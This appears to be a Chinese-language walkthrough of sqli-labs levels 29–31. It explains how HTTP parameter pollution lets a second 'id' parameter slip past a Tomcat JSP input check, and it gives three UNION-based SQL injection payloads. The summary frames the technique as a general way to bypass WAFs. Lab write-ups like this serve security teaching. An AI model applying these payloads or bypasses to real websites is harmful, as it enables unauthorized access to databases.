# 十四、答题模式-Less-29~31

### Less-29

首先这里我们查看jsp源码，它会对第一个参数id进行正则匹配 ` ^\\d+$ ` ，匹配通过后请求Apache(php)服务器。

根据HPP原理，我们可以构造payload:

    ?id=1&id=-1' union seslect 1,user(),3--+

在这里，我们要先绕过Tomcat的jsp代码先，因此需第一个id是正常值，&后面的id值才是我们的注入。


### Less-30

原理和Less-29是一直的，只是在sql处理上是双引号。因此此处也可以直接丢出payload:
    
    ?id=1&id=-1"union%20select%201,user(),3--+
    

### Less-31


原理和上述两个例子是一样的，只是sql处理上是双引号加括号的处理。因此此处也可以直接丢出payload:

    ?id=1&id=-1%22)union%20select%201,user(),3--+

> %22是双引号，%20是空格。


**总结**：从以上三关中，我们主要学习到的是不同服务器对于参数的不同处理，HPP 的应用有很多，不仅仅是我们上述列出过WAF一个方面，还有可以执行重复操作，可以执行非法操作等。同时针对WAF的绕过，我们这里也仅仅是抛砖引玉，后续的很多的有关HPP 的方法需要共同去研究。这也是一个新的方向。

